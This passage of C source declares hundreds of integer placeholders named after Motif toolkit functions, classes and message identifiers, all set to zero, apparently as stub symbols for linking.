0;\nint _XmEntryDirectionGet = 0;\nint _XmEntryDirectionSet = 0;\nint _XmEntryPopGet = 0;\nint _XmEntryPushGet = 0;\nint _XmEntryRendBeginCountGet = 0;\nint _XmEntryRendBeginGet = 0;\nint _XmEntryRendBeginSet = 0;\nint _XmEntryRendEndCountGet = 0;\nint _XmEntryRendEndGet = 0;\nint _XmEntryRendEndSet = 0;\nint _XmEntryTabsGet = 0;\nint _XmEntryTag = 0;\nint _XmEntryTagSet = 0;\nint _XmEntryTextGet = 0;\nint _XmEntryTextSet = 0;\nint _XmEntryTextTypeGet = 0;\nint XmeParseUnits = 0;\nint XmePrimarySink = 0;\nint XmePrimarySource = 0;\nint XmeQueryBestCursorSize = 0;\nint _XmEraseShadow = 0;\nint XmeRedisplayGadgets = 0;\nint XmeRemoveFocusChangeCallback = 0;\nint XmeRenderTableGetDefaultFont = 0;\nint XmeReplyToQueryGeometry = 0;\nint XmeResolvePartOffsets = 0;\nint XmeSecondarySink = 0;\nint XmeSecondarySource = 0;\nint XmeSecondaryTransfer = 0;\nint XmeSetWMShellTitle = 0;\nint XmeStandardConvert = 0;\nint XmeStandardTargets = 0;\nint XmeStringGetComponent = 0;\nint XmeStringIsValid = 0;\nint XmeToHorizontalPixels = 0;\nint XmeToVerticalPixels = 0;\nint XmeTraitGet = 0;\nint XmeTraitSet = 0;\nint XmeTransferAddDoneProc = 0;\nint XmeUseColorObj = 0;\nint XmeVirtualToActualKeysyms = 0;\nint XmeVLCreateWidget = 0;\nint XmeWarning = 0;\nint XME_WARNING = 0;\nint XmeXpmAttributesSize = 0;\nint XmeXpmCreateBufferFromImage = 0;\nint XmeXpmCreateBufferFromPixmap = 0;\nint XmeXpmCreateBufferFromXpmImage = 0;\nint XmeXpmCreateDataFromImage = 0;\nint XmeXpmCreateDataFromPixmap = 0;\nint XmeXpmCreateDataFromXpmImage = 0;\nint XmeXpmCreateImageFromBuffer = 0;\nint XmeXpmCreateImageFromData = 0;\nint XmeXpmCreateImageFromXpmImage = 0;\nint XmeXpmCreatePixmapFromBuffer = 0;\nint XmeXpmCreatePixmapFromData = 0;\nint XmeXpmCreatePixmapFromXpmImage = 0;\nint XmeXpmCreateXpmImageFromBuffer = 0;\nint XmeXpmCreateXpmImageFromData = 0;\nint XmeXpmCreateXpmImageFromImage = 0;\nint XmeXpmCreateXpmImageFromPixmap = 0;\nint XmeXpmFree = 0;\nint XmeXpmFreeAttributes = 0;\nint XmeXpmFreeExtensions = 0;\nint XmeXpmFreeXpmImage = 0;\nint XmeXpmFreeXpmInfo = 0;\nint XmeXpmGetErrorString = 0;\nint XmeXpmLibraryVersion = 0;\nint XmeXpmReadFileToBuffer = 0;\nint XmeXpmReadFileToData = 0;\nint XmeXpmReadFileToImage = 0;\nint XmeXpmReadFileToPixmap = 0;\nint XmeXpmReadFileToXpmImage = 0;\nint XmeXpmWriteFileFromBuffer = 0;\nint XmeXpmWriteFileFromData = 0;\nint XmeXpmWriteFileFromImage = 0;\nint XmeXpmWriteFileFromPixmap = 0;\nint XmeXpmWriteFileFromXpmImage = 0;\nint xmExt18ListClassRec = 0;\nint XmExt18ListDeselectItems = 0;\nint XmExt18ListDeselectRow = 0;\nint XmExt18ListGetSelectedRowArray = 0;\nint XmExt18ListGetSelectedRows = 0;\nint XmExt18ListMakeRowVisible = 0;\nint XmExt18ListSelectAllItems = 0;\nint XmExt18ListSelectItems = 0;\nint XmExt18ListSelectRow = 0;\nint XmExt18ListToggleRow = 0;\nint XmExt18ListUnselectAllItems = 0;\nint XmExt18ListUnselectItem = 0;\nint xmExt18ListWidgetClass = 0;\nint xmExtClassRec = 0;\nint _XmExtGetValuesHook = 0;\nint _XmExtHighlightBorder = 0;\nint _XmExtImportArgs = 0;\nint _XmExtObjAlloc = 0;\nint xmExtObjectClass = 0;\nint _XmExtObjFree = 0;\nint _XmExtUnhighlightBorder = 0;\nint _Xm_fastPtr = 0;\nint _XmFastSubclassInit = 0;\nint _XmFileSBGeoMatrixCreate = 0;\nint xmFileSelectionBoxClassRec = 0;\nint _XmFileSelectionBoxCreateDirList = 0;\nint _XmFileSelectionBoxCreateDirListLabel = 0;\nint _XmFileSelectionBoxCreateFilterLabel = 0;\nint _XmFileSelectionBoxCreateFilterText = 0;\nint _XmFileSelectionBoxFocusMoved = 0;\nint XmFileSelectionBoxGetChild = 0;\nint _XmFileSelectionBoxGetDirectory = 0;\nint _XmFileSelectionBoxGetDirListItemCount = 0;\nint _XmFileSelectionBoxGetDirListItems = 0;\nint _XmFileSelectionBoxGetDirListLabelString = 0;\nint _XmFileSelectionBoxGetDirMask = 0;\nint _XmFileSelectionBoxGetFilterLabelString = 0;\nint _XmFileSelectionBoxGetListItemCount = 0;\nint _XmFileSelectionBoxGetListItems = 0;\nint _XmFileSelectionBoxGetNoMatchString = 0;\nint _XmFileSelectionBoxGetPattern = 0;\nint _XmFileSelectionBoxNoGeoRequest = 0;\nint _XmFileSelectionBoxRestore = 0;\nint _XmFileSelectionBoxUpOrDown = 0;\nint xmFileSelectionBoxWidgetClass = 0;\nint XmFileSelectionDoSearch = 0;\nint _XmFilterArgs = 0;\nint _XmFilterResources = 0;\nint _XmFindNextTabGroup = 0;\nint _XmFindPrevTabGroup = 0;\nint _XmFindTabGroup = 0;\nint _XmFindTopMostShell = 0;\nint _XmFindTraversablePrim = 0;\nint _XmFocusInGadget = 0;\nint _XmFocusIsHere = 0;\nint _XmFocusIsInShell = 0;\nint _XmFocusModelChanged = 0;\nint _XmFocusOutGadget = 0;\nint XmFontListAdd = 0;\nint XmFontListAppendEntry = 0;\nint XmFontListCopy = 0;\nint XmFontListCreate = 0;\nint XmFontListCreate_r = 0;\nint XmFontListEntryCreate = 0;\nint XmFontListEntryCreate_r = 0;\nint XmFontListEntryFree = 0;\nint XmFontListEntryGetFont = 0;\nint XmFontListEntryGetTag = 0;\nint XmFontListEntryLoad = 0;\nint XmFontListFree = 0;\nint XmFontListFreeFontContext = 0;\nint _XmFontListGetDefaultFont = 0;\nint XmFontListGetNextFont = 0;\nint XmFontListInitFontContext = 0;\nint XmFontListNextEntry = 0;\nint XmFontListRemoveEntry = 0;\nint _XmFontListSearch = 0;\nint xmFontSelectorClassRec = 0;\nint xmFontSelectorWidgetClass = 0;\nint _XmForegroundColorDefault = 0;\nint xmFormClassRec = 0;\nint xmFormWidgetClass = 0;\nint xmFrameClassRec = 0;\nint _XmFrame_defaultTranslations = 0;\nint xmFrameWidgetClass = 0;\nint _XmFreeDragReceiverInfo = 0;\nint _XmFreeHashTable = 0;\nint _XmFreeMotifAtom = 0;\nint _XmFreeScratchPixmap = 0;\nint _XmFreeTravGraph = 0;\nint _XmFreeWidgetExtData = 0;\nint _XmFromHorizontalPixels = 0;\nint _XmFromLayoutDirection = 0;\nint _XmFromPanedPixels = 0;\nint _XmFromVerticalPixels = 0;\nint _XmGadClassExtRec = 0;\nint _XmGadgetActivate = 0;\nint _XmGadgetArm = 0;\nint _XmGadgetButtonMotion = 0;\nint xmGadgetClass = 0;\nint xmGadgetClassRec = 0;\nint _XmGadgetDrag = 0;\nint _XmGadgetGetValuesHook = 0;\nint _XmGadgetImportArgs = 0;\nint _XmGadgetImportSecondaryArgs = 0;\nint _XmGadgetKeyInput = 0;\nint _XmGadgetMultiActivate = 0;\nint _XmGadgetMultiArm = 0;\nint _XmGadgetSelect = 0;\nint _XmGadgetTraverseCurrent = 0;\nint _XmGadgetTraverseDown = 0;\nint _XmGadgetTraverseHome = 0;\nint _XmGadgetTraverseLeft = 0;\nint _XmGadgetTraverseNext = 0;\nint _XmGadgetTraverseNextTabGroup = 0;\nint _XmGadgetTraversePrev = 0;\nint _XmGadgetTraversePrevTabGroup = 0;\nint _XmGadgetTraverseRight = 0;\nint _XmGadgetTraverseUp = 0;\nint _XmGadgetWarning = 0;\nint _XmGeoAdjustBoxes = 0;\nint _XmGeoArrangeBoxes = 0;\nint _XmGeoBoxesSameHeight = 0;\nint _XmGeoBoxesSameWidth = 0;\nint _XmGeoClearRectObjAreas = 0;\nint _XmGeoCount_kids = 0;\nint _XmGeoGetDimensions = 0;\nint _XmGeoLoadValues = 0;\nint _XmGeoMatrixAlloc = 0;\nint _XmGeoMatrixFree = 0;\nint _XmGeoMatrixGet = 0;\nint _XmGeoMatrixSet = 0;\nint _XmGeometryEqual = 0;\nint _XmGeoReplyYes = 0;\nint _XmGeoSetupKid = 0;\nint _XmGetActiveDropSite = 0;\nint _XmGetActiveItem = 0;\nint _XmGetActiveProtocolStyle = 0;\nint _XmGetActiveTabGroup = 0;\nint _XmGetActiveTopLevelMenu = 0;\nint _XmGetActualClass = 0;\nint _XmGetArrowDrawRects = 0;\nint XmGetAtomName = 0;\nint _XmGetAudibleWarning = 0;\nint _XmGetBGPixmapName = 0;\nint _XmGetBitmapConversionModel = 0;\nint _XmGetBottomShadowColor = 0;\nint _XmGetClassExtensionPtr = 0;\nint _XmGetColorAllocationProc = 0;\nint XmGetColorCalculation = 0;\nint _XmGetColorCalculationProc = 0;\nint _XmGetColoredPixmap = 0;\nint _XmGetColors = 0;\nint XmGetColors = 0;\nint _XmGetDefaultBackgroundColorSpec = 0;\nint _XmGetDefaultColors = 0;\nint _XmGetDefaultDisplay = 0;\nint _XmGetDefaultFontList = 0;\nint _XmGetDefaultThresholdsForScreen = 0;\nint _XmGetDefaultTime = 0;\nint XmGetDestination = 0;\nint _XmGetDisplayObject = 0;\nint XmGetDragContext = 0;\nint _XmGetDragContextFromHandle = 0;\nint _XmGetDragCursorCachePtr = 0;\nint _XmGetDragProtocolStyle = 0;\nint _XmGetDragProxyWindow = 0;\nint _XmGetDragReceiverInfo = 0;\nint _XmGetDropSiteManagerObject = 0;\nint _XmGetEffectiveView = 0;\nint _XmGetEncodingRegistryTarget = 0;\nint _XmGetFirstFocus = 0;\nint _XmGetFirstFont = 0;\nint _XmGetFocus = 0;\nint _XmGetFocusData = 0;\nint _XmGetFocusFlag = 0;\nint _XmGetFocusPolicy = 0;\nint _XmGetFocusResetFlag = 0;\nint XmGetFocusWidget = 0;\nint _XmGetFontUnit = 0;\nint _XmGetHashEntryIterate = 0;\nint _XmGetHighlightColor = 0;\nint _XmGetIconControlInfo = 0;\nint XmGetIconFileName = 0;\nint _XmGetIconPixmapName = 0;\nint _XmGetImage = 0;\nint _XmGetImageAndHotSpotFromFile = 0;\nint _XmGetImageFromFile = 0;\nint _XmGetInDragMode = 0;\nint _XmGetInsensitiveStippleBitmap = 0;\nint _XmGetKidGeo = 0;\nint _XmGetLayoutDirection = 0;\nint _XmGetManagedInfo = 0;\nint _XmGetMaxCursorSize = 0;\nint _XmGetMBStringFromXmString = 0;\nint XmGetMenuCursor = 0;\nint _XmGetMenuCursorByScreen = 0;\nint _XmGetMenuProcContext = 0;\nint _XmGetMenuState = 0;\nint _XmGetMotifAtom = 0;\nint _XmGetMoveOpaqueByScreen = 0;\nint _XmGetNavigability = 0;\nint _XmGetNavigationType = 0;\nint _Xm_GetNewElement = 0;\nint XmGetNewPictureState = 0;\nint _XmGetNullCursor = 0;\nint _XmGetPixelData = 0;\nint _XmGetPixmap = 0;\nint XmGetPixmap = 0;\nint _XmGetPixmapBasedGC = 0;\nint XmGetPixmapByDepth = 0;\nint _XmGetPixmapData = 0;\nint _XmGetPointVisibility = 0;\nint _XmGetPopupMenuClick = 0;\nint XmGetPostedFromWidget = 0;\nint _XmGetRC_PopupPosted = 0;\nint _XmGetRealXlations = 0;\nint _XmGetScaledPixmap = 0;\nint XmGetScaledPixmap = 0;\nint _XmGetScreenObject = 0;\nint XmGetSecondaryResourceData = 0;\nint _XmGetTabGroup = 0;\nint XmGetTabGroup = 0;\nint XmGetTearOffControl = 0;\nint _XmGetTextualDragIcon = 0;\nint XmGetToolTipString = 0;\nint _XmGetTopShadowColor = 0;\nint _XmGetTransientFlag = 0;\nint _XmGetUnitType = 0;\nint _XmGetUnpostBehavior = 0;\nint XmGetVisibility = 0;\nint _XmGetWidgetExtData = 0;\nint _XmGetWidgetNavigPtrs = 0;\nint _XmGetWorldObject = 0;\nint _XmGetWrapperData = 0;\nint XmGetXmDisplay = 0;\nint _XmGetXmDisplayClass = 0;\nint XmGetXmScreen = 0;\nint _XmGMCalcSize = 0;\nint _XmGMDoLayout = 0;\nint _XmGMEnforceMargin = 0;\nint _XmGMHandleGeometryManager = 0;\nint _XmGMHandleQueryGeometry = 0;\nint _XmGMOverlap = 0;\nint _XmGMReplyToQueryGeometry = 0;\nint _XmGrabKeyboard = 0;\nint _XmGrabPointer = 0;\nint xmGrabShellClassRec = 0;\nint _XmGrabShell_translations = 0;\nint xmGrabShellWidgetClass = 0;\nint _XmGrabTheFocus = 0;\nint _XmHandleGeometryManager = 0;\nint _XmHandleMenuButtonPress = 0;\nint _XmHandleQueryGeometry = 0;\nint _XmHandleSizeUpdate = 0;\nint _XmHashTableCount = 0;\nint _XmHashTableSize = 0;\nint _XmHeapAlloc = 0;\nint _XmHeapCreate = 0;\nint _XmHeapFree = 0;\nint xmHierarchyClassRec = 0;\nint XmHierarchyGetChildNodes = 0;\nint XmHierarchyOpenAllAncestors = 0;\nint xmHierarchyWidgetClass = 0;\nint _XmHighlightBorder = 0;\nint _XmHighlightColorDefault = 0;\nint _XmHighlightPixmapDefault = 0;\nint _XmHWQuery = 0;\nint xmI18ListClassRec = 0;\nint XmI18ListDeselectItems = 0;\nint XmI18ListDeselectRow = 0;\nint XmI18ListDoSearch = 0;\nint XmI18ListFindRow = 0;\nint XmI18ListGetSelectedRowArray = 0;\nint XmI18ListGetSelectedRows = 0;\nint XmI18ListMakeRowVisible = 0;\nint XmI18ListSelectAllItems = 0;\nint XmI18ListSelectItems = 0;\nint XmI18ListSelectRow = 0;\nint XmI18ListToggleRow = 0;\nint xmI18ListWidgetClass = 0;\nint _XmICCCallbackToICCEvent = 0;\nint _XmICCEventToICCCallback = 0;\nint xmIconBoxClassRec = 0;\nint XmIconBoxIsCellEmpty = 0;\nint xmIconBoxWidgetClass = 0;\nint xmIconButtonClassRec = 0;\nint xmIconButtonWidgetClass = 0;\nint xmIconGadgetClass = 0;\nint xmIconGadgetClassRec = 0;\nint _XmIconGadgetIconPos = 0;\nint xmIconGCacheObjClassRec = 0;\nint xmIconHeaderClass = 0;\nint xmIconHeaderClassRec = 0;\nint _XmIEndUpdate = 0;\nint _XmImChangeManaged = 0;\nint XmImCloseXIM = 0;\nint _XmImFreeShellData = 0;\nint XmImFreeXIC = 0;\nint XmImGetXIC = 0;\nint XmImGetXICResetState = 0;\nint XmImGetXIM = 0;\nint XmImMbLookupString = 0;\nint XmImMbResetIC = 0;\nint _XmImRealize = 0;\nint _XmImRedisplay = 0;\nint XmImRegister = 0;\nint _XmImResize = 0;\nint XmImSetFocusValues = 0;\nint XmImSetValues = 0;\nint XmImSetXIC = 0;\nint XmImUnregister = 0;\nint XmImUnsetFocus = 0;\nint XmImVaSetFocusValues = 0;\nint XmImVaSetValues = 0;\nint _XmIndexToTargets = 0;\nint _XmInheritClass = 0;\nint _XmInImageCache = 0;\nint _XmInitByteOrderChar = 0;\nint _XmInitializeExtensions = 0;\nint _XmInitializeMenuCursor = 0;\nint _XmInitializeScrollBars = 0;\nint _XmInitializeSyntheticResources = 0;\nint _XmInitializeTraits = 0;\nint _XmInitModifiers = 0;\nint _XmInitTargetsTable = 0;\nint _XmInputForGadget = 0;\nint _XmInputInGadget = 0;\nint _XmInstallImage = 0;\nint XmInstallImage = 0;\nint _XmInstallPixmap = 0;\nint _XmInstallProtocols = 0;\nint XmInternAtom = 0;\nint _XmIntersectionOf = 0;\nint _XmIntersectRect = 0;\nint _XmInvalidCursorIconQuark = 0;\nint _XmIsActiveTearOff = 0;\nint _XmIsEventUnique = 0;\nint _XmIsFastSubclass = 0;\nint _XmIsISO10646 = 0;\nint XmIsMotifWMRunning = 0;\nint _XmIsNavigable = 0;\nint _XmIsScrollableClipWidget = 0;\nint _XmIsSlowSubclass = 0;\nint _XmIsStandardMotifWidgetClass = 0;\nint _XmIsSubclassOf = 0;\nint _XmIsTearOffShellDescendant = 0;\nint XmIsTraversable = 0;\nint _XmIsViewable = 0;\nint _XmJpegErrorExit = 0;\nint _XmJpegGetImage = 0;\nint _XmLabel_AccessTextualRecord = 0;\nint _XmLabelCacheCompare = 0;\nint _XmLabelCalcTextRect = 0;\nint xmLabelClassRec = 0;\nint _XmLabelCloneMenuSavvy = 0;\nint _XmLabelConvert = 0;\nint _XmLabel_defaultTranslations = 0;\nint _XmLabelGadClassExtRec = 0;\nint xmLabelGadgetClass = 0;\nint xmLabelGadgetClassRec = 0;\nint xmLabelGCacheObjClassRec = 0;\nint _XmLabelGCalcTextRect = 0;\nint _XmLabelGCloneMenuSavvy = 0;\nint _XmLabelGCVTRedraw = 0;\nint _XmLabel_menuTranslations = 0;\nint _XmLabel_menu_traversal_events = 0;\nint _XmLabelPrimClassExtRec = 0;\nint _XmLabelSetBackgroundGC = 0;\nint xmLabelWidgetClass = 0;\nint _XmLeafPaneFocusOut = 0;\nint _XmLeaveGadget = 0;\nint _XmLinkCursorIconQuark = 0;\nint _XmListAddAfter = 0;\nint _XmListAddBefore = 0;\nint XmListAddItem = 0;\nint XmListAddItems = 0;\nint XmListAddItemsUnselected = 0;\nint XmListAddItemUnselected = 0;\nint xmListClassRec = 0;\nint _XmListCount = 0;\nint XmListDeleteAllItems = 0;\nint XmListDeleteItem = 0;\nint XmListDeleteItems = 0;\nint XmListDeleteItemsPos = 0;\nint XmListDeletePos = 0;\nint XmListDeletePositions = 0;\nint XmListDeselectAllItems = 0;\nint XmListDeselectItem = 0;\nint XmListDeselectPos = 0;\nint _XmListExec = 0;\nint _XmListFree = 0;\nint XmListGetKbdItemPos = 0;\nint XmListGetMatchPos = 0;\nint XmListGetSelectedPos = 0;\nint _XmListInit = 0;\nint XmListItemExists = 0;\nint XmListItemPos = 0;\nint _XmList_ListXlations1 = 0;\nint _XmList_ListXlations2 = 0;\nint XmListPosSelected = 0;\nint XmListPosToBounds = 0;\nint _XmListRemove = 0;\nint XmListReplaceItems = 0;\nint XmListReplaceItemsPos = 0;\nint XmListReplaceItemsPosUnselected = 0;\nint XmListReplaceItemsUnselected = 0;\nint XmListReplacePositions = 0;\nint XmListSelectItem = 0;\nint XmListSelectPos = 0;\nint XmListSetAddMode = 0;\nint XmListSetBottomItem = 0;\nint XmListSetBottomPos = 0;\nint XmListSetHorizPos = 0;\nint XmListSetItem = 0;\nint XmListSetKbdItemPos = 0;\nint XmListSetPos = 0;\nint XmListUpdateSelectedList = 0;\nint xmListWidgetClass = 0;\nint XmListYToPos = 0;\nint _XmLowerCase = 0;\nint _XmLowerTearOffObscuringPoppingDownPanes = 0;\nint xmMainWindowClassRec = 0;\nint XmMainWindowSep1 = 0;\nint XmMainWindowSep2 = 0;\nint XmMainWindowSep3 = 0;\nint XmMainWindowSetAreas = 0;\nint xmMainWindowWidgetClass = 0;\nint _XmMakeGeometryRequest = 0;\nint xmManagerClassRec = 0;\nint _XmManager_defaultTranslations = 0;\nint _XmManagerEnter = 0;\nint _XmManagerFocusIn = 0;\nint _XmManagerFocusInInternal = 0;\nint _XmManagerFocusOut = 0;\nint _XmManagerGetValuesHook = 0;\nint _XmManagerHelp = 0;\nint _XmManagerHighlightPixmapDefault = 0;\nint _XmManagerImportArgs = 0;\nint _XmManagerLeave = 0;\nint _XmManager_managerTraversalTranslations = 0;\nint _XmManagerParentActivate = 0;\nint _XmManagerParentCancel = 0;\nint _XmManagerTopShadowPixmapDefault = 0;\nint _XmManagerUnmap = 0;\nint xmManagerWidgetClass = 0;\nint _XmMapBtnEvent = 0;\nint _XmMapHashTable = 0;\nint _XmMapKeyEvent = 0;\nint _XmMapKeyEvents = 0;\nint XmMapSegmentEncoding = 0;\nint _XmMatchBDragEvent = 0;\nint _XmMatchBSelectEvent = 0;\nint _XmMatchBtnEvent = 0;\nint _XmMatchKeyEvent = 0;\nint _XmMenuBarFix = 0;\nint _XmMenuBarGadgetSelect = 0;\nint _XmMenuBtnDown = 0;\nint _XmMenuBtnUp = 0;\nint _XmMenuButtonTakeFocus = 0;\nint _XmMenuButtonTakeFocusUp = 0;\nint _XmMenuCursorContext = 0;\nint _XmMenuEscape = 0;\nint _XmMenuFocus = 0;\nint _XmMenuFocusIn = 0;\nint _XmMenuFocusOut = 0;\nint _XmMenuGadgetDrag = 0;\nint _XmMenuGadgetTraverseCurrent = 0;\nint _XmMenuGadgetTraverseCurrentUp = 0;\nint _XmMenuGrabKeyboardAndPointer = 0;\nint _XmMenuHelp = 0;\nint _XmMenuPopDown = 0;\nint XmMenuPosition = 0;\nint _XmMenuSetInPMMode = 0;\nint xmMenuShellClassRec = 0;\nint _XmMenuShell_translations = 0;\nint xmMenuShellWidgetClass = 0;\nint _XmMenuTraversalHandler = 0;\nint _XmMenuTraverseDown = 0;\nint _XmMenuTraverseLeft = 0;\nint _XmMenuTraverseRight = 0;\nint _XmMenuTraverseUp = 0;\nint _XmMenuUnmap = 0;\nint xmMessageBoxClassRec = 0;\nint _XmMessageBoxGeoMatrixCreate = 0;\nint XmMessageBoxGetChild = 0;\nint _XmMessageBoxNoGeoRequest = 0;\nint xmMessageBoxWidgetClass = 0;\nint _XmMessageTypeToReason = 0;\nint _XmMgrTraversal = 0;\nint _XmMicroSleep = 0;\nint _Xm_MOTIF_DRAG_AND_DROP_MESSAGE = 0;\nint _XmMoveCursorIconQuark = 0;\nint _XmMoveObject = 0;\nint _XmMoveWidget = 0;\nint _XmMsgBaseClass_0000 = 0;\nint _XmMsgBaseClass_0001 = 0;\nint _XmMsgBulletinB_0001 = 0;\nint _XmMsgCascadeB_0000 = 0;\nint _XmMsgCascadeB_0001 = 0;\nint _XmMsgCascadeB_0002 = 0;\nint _XmMsgCascadeB_0003 = 0;\nint _XmMsgColObj_0001 = 0;\nint _XmMsgColObj_0002 = 0;\nint _XmMsgComboBox_0000 = 0;\nint _XmMsgComboBox_0001 = 0;\nint _XmMsgComboBox_0004 = 0;\nint _XmMsgComboBox_0005 = 0;\nint _XmMsgComboBox_0006 = 0;\nint _XmMsgComboBox_0007 = 0;\nint _XmMsgComboBox_0008 = 0;\nint _XmMsgComboBox_0009 = 0;\nint _XmMsgComboBox_0010 = 0;\nint _XmMsgComboBox_0011 = 0;\nint _XmMsgComboBox_0012 = 0;\nint _XmMsgComboBox_0013 = 0;\nint _XmMsgComboBox_0014 = 0;\nint _XmMsgCommand_0000 = 0;\nint _XmMsgCommand_0001 = 0;\nint _XmMsgCommand_0002 = 0;\nint _XmMsgCommand_0003 = 0;\nint _XmMsgCommand_0004 = 0;\nint _XmMsgCommand_0005 = 0;\nint _XmMsgContainer_0000 = 0;\nint _XmMsgContainer_0001 = 0;\nint _XmMsgCutPaste_0000 = 0;\nint _XmMsgCutPaste_0001 = 0;\nint _XmMsgCutPaste_0002 = 0;\nint _XmMsgCutPaste_0003 = 0;\nint _XmMsgCutPaste_0004 = 0;\nint _XmMsgCutPaste_0005 = 0;\nint _XmMsgCutPaste_0006 = 0;\nint _XmMsgCutPaste_0007 = 0;\nint _XmMsgCutPaste_0008 = 0;\nint _XmMsgCutPaste_0009 = 0;\nint _XmMsgDataF_0000 = 0;\nint _XmMsgDataF_0001 = 0;\nint _XmMsgDataF_0002 = 0;\nint _XmMsgDataF_0003 = 0;\nint _XmMsgDataF_0004 = 0;\nint _XmMsgDataF_0005 = 0;\nint _XmMsgDataF_0006 = 0;\nint _XmMsgDataFWcs_0000 = 0;\nint _XmMsgDataFWcs_0001 = 0;\nint _XmMsgDialogS_0000 = 0;\nint _XmMsgDisplay_0001 = 0;\nint _XmMsgDisplay_0002 = 0;\nint _XmMsgDisplay_0003 = 0;\nint _XmMsgDragBS_0000 = 0;\nint _XmMsgDragBS_0001 = 0;\nint _XmMsgDragBS_0002 = 0;\nint _XmMsgDragBS_0003 = 0;\nint _XmMsgDragBS_0004 = 0;\nint _XmMsgDragBS_0005 = 0;\nint _XmMsgDragBS_0006 = 0;\nint _XmMsgDragC_0001 = 0;\nint _XmMsgDragC_0002 = 0;\nint _XmMsgDragC_0003 = 0;\nint _XmMsgDragC_0004 = 0;\nint _XmMsgDragC_0005 = 0;\nint _XmMsgDragC_0006 = 0;\nint _XmMsgDragICC_0000 = 0;\nint _XmMsgDragICC_0001 = 0;\nint _XmMsgDragIcon_0000 = 0;\nint _XmMsgDragIcon_0001 = 0;\nint _XmMsgDragOverS_0000 = 0;\nint _XmMsgDragOverS_0001 = 0;\nint _XmMsgDragOverS_0002 = 0;\nint _XmMsgDragOverS_0003 = 0;\nint _XmMsgDragUnder_0000 = 0;\nint _XmMsgDragUnder_0001 = 0;\nint _XmMsgDropSMgr_0001 = 0;\nint _XmMsgDropSMgr_0002 = 0;\nint _XmMsgDropSMgr_0003 = 0;\nint _XmMsgDropSMgr_0004 = 0;\nint _XmMsgDropSMgr_0005 = 0;\nint _XmMsgDropSMgr_0006 = 0;\nint _XmMsgDropSMgr_0007 = 0;\nint _XmMsgDropSMgr_0008 = 0;\nint _XmMsgDropSMgr_0009 = 0;\nint _XmMsgDropSMgr_0010 = 0;\nint _XmMsgDropSMgrI_0001 = 0;\nint _XmMsgDropSMgrI_0002 = 0;\nint _XmMsgDropSMgrI_0003 = 0;\nint _XmMsgForm_0000 = 0;\nint _XmMsgForm_0002 = 0;\nint _XmMsgForm_0003 = 0;\nint _XmMsgGadget_0000 = 0;\nint _XmMsgLabel_0003 = 0;\nint _XmMsgLabel_0004 = 0;\nint _XmMsgList_0000 = 0;\nint _XmMsgList_0005 = 0;\nint _XmMsgList_0006 = 0;\nint _XmMsgList_0007 = 0;\nint _XmMsgList_0008 = 0;\nint _XmMsgList_0009 = 0;\nint _XmMsgList_0010 = 0;\nint _XmMsgList_0011 = 0;\nint _XmMsgList_0012 = 0;\nint _XmMsgList_0013 = 0;\nint _XmMsgList_0014 = 0;\nint _XmMsgList_0015 = 0;\nint _XmMsgMainW_0000 = 0;\nint _XmMsgMainW_0001 = 0;\nint _XmMsgManager_0000 = 0;\nint _XmMsgManager_0001 = 0;\nint _XmMsgMenuShell_0000 = 0;\nint _XmMsgMenuShell_0001 = 0;\nint _XmMsgMenuShell_0002 = 0;\nint _XmMsgMenuShell_0003 = 0;\nint _XmMsgMenuShell_0004 = 0;\nint _XmMsgMenuShell_0005 = 0;\nint _XmMsgMenuShell_0006 = 0;\nint _XmMsgMenuShell_0007 = 0;\nint _XmMsgMenuShell_0008 = 0;\nint _XmMsgMenuShell_0009 = 0;\nint _XmMsgMessageB_0003 = 0;\nint _XmMsgMessageB_0004 = 0;\nint _XmMsgMotif_0000 = 0;\nint _XmMsgMotif_0001 = 0;\nint _XmMsgNotebook_0000 = 0;\nint _XmMsgPanedW_0000 = 0;\nint _XmMsgPanedW_0001 = 0;\nint _XmMsgPanedW_0002 = 0;\nint _XmMsgPanedW_0004 = 0;\nint _XmMsgPanedW_0005 = 0;\nint _XmMsgPixConv_0000 = 0;\nint _XmMsgPrimitive_0000 = 0;\nint _XmMsgProtocols_0000 = 0;\nint _XmMsgProtocols_0001 = 0;\nint _XmMsgProtocols_0002 = 0;\nint _XmMsgRegion_0000 = 0;\nint _XmMsgRepType_0000 = 0;\nint _XmMsgRepType_0001 = 0;\nint _XmMsgRepType_0002 = 0;\nint _XmMsgResConvert_0001 = 0;\nint _XmMsgResConvert_0002 = 0;\nint _XmMsgResConvert_0003 = 0;\nint _XmMsgResConvert_0005 = 0;\nint _XmMsgResConvert_0006 = 0;\nint _XmMsgResConvert_0007 = 0;\nint _XmMsgResConvert_0008 = 0;\nint _XmMsgResConvert_0009 = 0;\nint _XmMsgResConvert_0010 = 0;\nint _XmMsgResConvert_0011 = 0;\nint _XmMsgResConvert_0012 = 0;\nint _XmMsgResConvert_0013 = 0;\nint _XmMsgResource_0001 = 0;\nint _XmMsgResource_0002 = 0;\nint _XmMsgResource_0003 = 0;\nint _XmMsgResource_0004 = 0;\nint _XmMsgResource_0005 = 0;\nint _XmMsgResource_0006 = 0;\nint _XmMsgResource_0007 = 0;\nint _XmMsgResource_0008 = 0;\nint _XmMsgResource_0009 = 0;\nint _XmMsgResource_0010 = 0;\nint _XmMsgResource_0011 = 0;\nint _XmMsgResource_0012 = 0;\nint _XmMsgResource_0013 = 0;\nint _XmMsgRowColText_0024 = 0;\nint _XmMsgRowColumn_0000 = 0;\nint _XmMsgRowColumn_0001 = 0;\nint _XmMsgRowColumn_0002 = 0;\nint _XmMsgRowColumn_0003 = 0;\nint _XmMsgRowColumn_0004 = 0;\nint _XmMsgRowColumn_0005 = 0;\nint _XmMsgRowColumn_0007 = 0;\nint _XmMsgRowColumn_0008 = 0;\nint _XmMsgRowColumn_0015 = 0;\nint _XmMsgRowColumn_0016 = 0;\nint _XmMsgRowColumn_0017 = 0;\nint _XmMsgRowColumn_0018 = 0;\nint _XmMsgRowColumn_0019 = 0;\nint _XmMsgRowColumn_0020 = 0;\nint _XmMsgRowColumn_0022 = 0;\nint _XmMsgRowColumn_0023 = 0;\nint _XmMsgRowColumn_0025 = 0;\nint _XmMsgRowColumn_0026 = 0;\nint _XmMsgRowColumn_0027 = 0;\nint _XmMsgScale_0000 = 0;\nint _XmMsgScale_0001 = 0;\nint _XmMsgScale_0002 = 0;\nint _XmMsgScale_0006 = 0;\nint _XmMsgScale_0007 = 0;\nint _XmMsgScale_0008 = 0;\nint _XmMsgScale_0009 = 0;\nint _XmMsgScaleScrBar_0004 = 0;\nint _XmMsgScreen_0000 = 0;\nint _XmMsgScreen_0001 = 0;\nint _XmMsgScrollBar_0000 = 0;\nint _XmMsgScrollBar_0001 = 0;\nint _XmMsgScrollBar_0002 = 0;\nint 